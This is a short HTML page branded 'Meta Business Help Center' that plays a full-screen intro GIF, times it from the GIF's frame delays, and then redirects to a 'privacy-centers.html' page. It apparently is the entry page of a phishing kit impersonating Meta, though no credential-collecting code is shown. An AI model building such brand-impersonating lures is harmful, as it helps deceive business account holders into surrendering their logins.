<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Business Help Center</title>
    <link rel="icon" href="./public/favicon-32x32.png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            width: 100%; height: 100%;
            background: #000;
            overflow: hidden;
        }
        img#introGif {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
        }
    </style>
</head>
<body>
    <img id="introGif" src="./public/images/intro.gif" alt="">
    <script>
        async function getGifDuration(url) {
            try {
                const res = await fetch(url);
                const buf = await res.arrayBuffer();
                const bytes = new Uint8Array(buf);
                let duration = 0;
                for (let i = 0; i < bytes.length - 3; i++) {
                    if (bytes[i] === 0x21 && bytes[i+1] === 0xF9 && bytes[i+2] === 0x04) {
                        const delay = (bytes[i+4] + bytes[i+5] * 256) * 10;
                        duration += delay;
                    }
                }
                return duration > 0 ? duration : 10000;
            } catch(e) {
                return 10000;
            }
        }
        getGifDuration('./public/images/intro.gif')
            .then(ms => {
                setTimeout(() => {
                    window.location.href = 'privacy-centers.html';
                }, ms);
            });
    </script>
</body>
</html>
